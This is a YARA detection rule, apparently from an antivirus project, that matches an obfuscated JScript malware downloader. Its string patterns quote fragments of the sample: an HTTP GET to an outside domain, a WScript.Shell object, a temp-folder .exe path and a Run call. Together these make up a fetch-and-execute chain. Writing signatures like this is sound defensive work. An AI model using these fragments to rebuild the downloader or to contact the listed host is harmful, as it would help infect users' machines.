rule sig_20160401_0f848a8b7c0ce5ed259c6d354d0b111d {
  meta:
    description = "datamaliciousorder - file 20160401_0f848a8b7c0ce5ed259c6d354d0b111d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5206ce743ce3d98545ea33b460e4c9d862f7a30373a6c6eed9971aba87050d0c"

  strings:
    $s1  = "KfMeb[UgSwc](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "function TdzCj(){return DlLry + \"\";};" fullword ascii
    $s3  = "function EabPgi(GyxRdj, IkvIva){HgGod = HgGod * 1; return GyxRdj - IkvIva;};" fullword ascii
    $s4  = "var DjqKi = function BrAo() {return WScript[PlsLjn](\"WScript\"+\".Shell\");}(), HpQh = 11;" fullword ascii
    $s5  = "if (KfMeb[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s6  = "function PgoKkt() {return DjqKi[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"SxgiT325A.ex\" + \"e\";};" fullword ascii
    $s7  = "function KvmMbj() {return ((DwgGk == true) && (DwgGk == IoJwq)) ? 1 : HgGod;};" fullword ascii
    $s8  = "return EabPgi(YaRv, JteMs);" fullword ascii
    $s9  = "var IoJwq = false;" fullword ascii
    $s10 = "DwgGk = true; " fullword ascii
    $s11 = "var YztJsw = false;" fullword ascii
    $s12 = "}while (PflEj);" fullword ascii
    $s13 = "function HhMwb()" fullword ascii
    $s14 = "var DwgGk = false;" fullword ascii
    $s15 = "function FgvScz(){return PlsLjn;};" fullword ascii
    $s16 = "function DpvSo(){return 23;};" fullword ascii
    $s17 = "function IuiOs(WanUzg) {var WinAu = (1, 2, 3, 4, 5, WanUzg); return WinAu;};" fullword ascii
    $s18 = "function ZiTpd(TrbTc){DjqKi[\"R\"+\"un\"](TrbTc, HgGod, HgGod);};" fullword ascii
    $s19 = "IoJwq = true; " fullword ascii
    $s20 = "var UfkRw = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}